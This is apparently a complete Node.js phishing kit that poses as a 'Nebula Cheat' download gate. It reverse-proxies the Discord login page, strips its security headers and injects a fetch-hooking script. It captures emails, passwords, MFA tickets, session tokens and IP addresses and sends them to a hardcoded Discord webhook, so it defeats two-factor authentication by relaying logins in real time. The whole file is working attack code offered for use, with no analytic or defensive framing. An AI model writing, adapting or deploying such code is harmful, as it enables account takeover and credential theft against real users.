const express = require('express');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const bodyParser = require('body-parser');
const cloudscraper = require('cloudscraper');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555233029730074787/3SlnHtR_N141bKlSRbrKTz_qICZt0kHXRzrNaAOvyQe75H1ClYGqgAQLDcT7jcoksYTY';
const DISCORD = 'https://discord.com';
const PORT = process.env.PORT || 3000;
let YOUR_DOMAIN = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

app.get('/ping', (req, res) => res.send('ok'));

async function cfFetch(path, opts = {}) {
  try {
    const r = await cloudscraper({
      uri: `${DISCORD}${path}`,
      method: opts.method || 'GET',
      body: opts.data ? JSON.stringify(opts.data) : undefined,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', ...(opts.headers || {}) },
      resolveWithFullResponse: true,
      simple: false,
      jar: jar,
    });
    
    const cleanHeaders = { ...r.headers };
    delete cleanHeaders['x-frame-options'];
    delete cleanHeaders['content-security-policy'];
    delete cleanHeaders['content-security-policy-report-only'];
    
    return { status: r.statusCode, data: r.body, headers: cleanHeaders };
  } catch (e) {
    const r = await client({ url: `${DISCORD}${path}`, ...opts });
    return { status: r.status, data: r.data, headers: r.headers };
  }
}

// ---------- FAKE LANDING PAGE (With Popup Window) ----------
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Nebula Cheat - Login Required</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: #0a0a0f; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; background-image: radial-gradient(circle at 50% 50%, rgba(88,101,242,0.15), transparent 60%); }
        .card { background: #14141c; padding: 48px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.1); text-align: center; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
        h1 { font-size: 28px; margin-bottom: 12px; background: linear-gradient(90deg, #5865F2, #eb459e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { color: #8a8a9a; margin-bottom: 32px; font-size: 15px; }
        button { background: #5865F2; color: white; border: none; padding: 16px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.2s; }
        button:hover { background: #4752C4; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>Nebula Cheat</h1>
        <p>You must verify your Discord account to download the cheat and access the loader.</p>
        <button onclick="openLogin()">Login with Discord</button>
      </div>
      <script>
        function openLogin() {
          const width = 500;
          const height = 700;
          const left = (screen.width / 2) - (width / 2);
          const top = (screen.height / 2) - (height / 2);
          window.open('/login', 'DiscordLogin', 'width=' + width + ',height=' + height + ',top=' + top + ',left=' + left);
        }
      </script>
    </body>
    </html>
  `);
});

// ---------- LOGIN PAGE ----------
app.get('/login', async (req, res) => {
  try {
    const r = await cfFetch('/login');
    let html = typeof r.data === 'string' ? r.data : r.data.toString();
    const domainHost = new URL(YOUR_DOMAIN).host;
    
    // Rewrite all discord URLs
    html = html.replace(/https:\/\/discord\.com/g, YOUR_DOMAIN);
    html = html.replace(/\/\/discord\.com/g, `//${domainHost}`);
    html = html.replace(/discord\.com\/api/g, `${YOUR_DOMAIN}/api`);
    html = html.replace(/discord\.com\/assets/g, `${YOUR_DOMAIN}/assets`);
    
    // Inject a SAFE capture script that doesn't break the page
    const safeScript = `
      <script>
        // Pure interception. We don't override fetch, we just spy on it.
        const originalFetch = window.fetch;
        window.fetch = async function() {
          const response = await originalFetch.apply(this, arguments);
          const url = arguments[0] ? arguments[0].toString() : '';
          
          if (url.includes('/auth/login') || url.includes('/auth/mfa')) {
            response.clone().json().then(data => {
              if (data.mfa && data.ticket) {
                sessionStorage.setItem('mfa_ticket', data.ticket);
                setTimeout(() => { window.location = '/mfa'; }, 300);
              }
              if (data.token) {
                navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: data.token }));
              }
            }).catch(() => {});
          }
          return response;
        };
      </script>
    `;
    
    html = html.replace('</body>', safeScript + '</body>');
    
    res.send(html);
  } catch (e) {
    res.status(500).send('error loading login page');
  }
});

// ---------- API PROXIES ----------
app.post('/api/v9/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const r = await cfFetch('/api/v9/auth/login', {
      method: 'POST',
      data: { email, password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json' },
    });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;

    if (data.mfa || data.ticket) {
      await sendToWebhook({ stage: 'mfa-required', email, password, ticket: data.ticket, ip: req.ip });
      return res.json({ mfa: true, ticket: data.ticket, message: 'mfa required' });
    }
    if (data.token) {
      await sendToWebhook({ stage: 'login-success', email, password, token: data.token, userId: data.user_id, ip: req.ip });
    }
    res.json(data);
  } catch (e) {
    console.error('Login post error:', e.message);
    res.status(500).json({ message: 'error communicating with discord' });
  }
});

app.post('/api/v9/auth/mfa', async (req, res) => {
  try {
    const { code, ticket } = req.body;
    const r = await cfFetch('/api/v9/auth/mfa', {
      method: 'POST',
      data: { code, ticket, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json' },
    });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    if (data.token) await sendToWebhook({ stage: 'mfa-success', token: data.token, userId: data.user_id, ip: req.ip });
    res.json(data);
  } catch (e) {
    res.status(500).json({ message: 'mfa error' });
  }
});

// MFA Visual Page
app.get('/mfa', (req, res) => {
  res.send(`
    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="width:380px;text-align:center">
        <h2 style="color:#5865F2">Two-Factor Authentication</h2>
        <p style="color:#8a8a9a;font-size:14px;margin:12px 0 24px">Enter the 6-digit code.</p>
        <input id="code" maxlength="6" style="width:100%;padding:14px;background:#1e1e28;border:1px solid #333;border-radius:8px;color:#fff;font-size:20px;text-align:center;letter-spacing:8px" placeholder="000000">
        <button onclick="submitMfa()" style="margin-top:16px;width:100%;padding:14px;background:#5865F2;border:none;border-radius:8px;color:#fff;font-size:16px;cursor:pointer">Verify</button>
      </div>
      <script>
        async function submitMfa() {
          const r = await fetch('/api/v9/auth/mfa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: document.getElementById('code').value, ticket: sessionStorage.getItem('mfa_ticket') }) });
          const data = await r.json();
          if (data.token) { window.location = '/success'; } else { alert('Invalid code'); }
        }
      </script>
    </body></html>
  `);
});

app.get('/assets/*', async (req, res) => {
  try {
    const r = await cfFetch(`/assets${req.path.replace('/assets','')}`);
    if (r.headers) res.set(r.headers);
    res.send(r.data);
  } catch (e) { res.status(404).end(); }
});

app.all('/api/*', async (req, res) => {
  try {
    const r = await cfFetch(req.originalUrl, { method: req.method, data: req.body, headers: { 'Content-Type': 'application/json' } });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    res.status(r.status).json(data);
  } catch (e) { res.status(500).json({ error: true }); }
});

app.post('/harvest', (req, res) => {
  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e) {} }
  sendToWebhook({ stage: 'client-beacon', ...body, ip: req.ip });
  res.json({ ok: true });
});

app.get('/success', (req, res) => {
  res.send(`
    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="text-align:center">
        <h1 style="color:#57F287;font-size:48px">Login Successful</h1>
        <p style="color:#8a8a9a;font-size:18px">Enjoy your cheat. Download will start shortly.</p>
        <script>setTimeout(() => { window.close(); }, 3000);</script>
      </div>
    </body></html>
  `);
});

async function sendToWebhook(p) {
  try {
    const fields = [];
    if (p.stage) fields.push({ name: 'Stage', value: p.stage, inline: false });
    if (p.email) fields.push({ name: 'Email', value: p.email, inline: true });
    if (p.password) fields.push({ name: 'Password', value: p.password, inline: true });
    if (p.token) fields.push({ name: 'Token', value: '```' + p.token + '```', inline: false });
    if (p.ticket) fields.push({ name: 'MFA Ticket', value: '```' + p.ticket + '```', inline: false });
    if (p.userId) fields.push({ name: 'User ID', value: p.userId, inline: true });
    if (p.ip) fields.push({ name: 'IP', value: p.ip, inline: true });

    await axios.post(WEBHOOK_URL, {
      username: 'Nebula Logger',
      embeds: [{ title: 'Discord Capture', color: 0x5865F2, fields: fields, timestamp: new Date().toISOString() }],
    });
  } catch (e) { console.error('webhook fail:', e.message); }
}

app.listen(PORT, () => console.log(`Proxy running on port ${PORT}`));
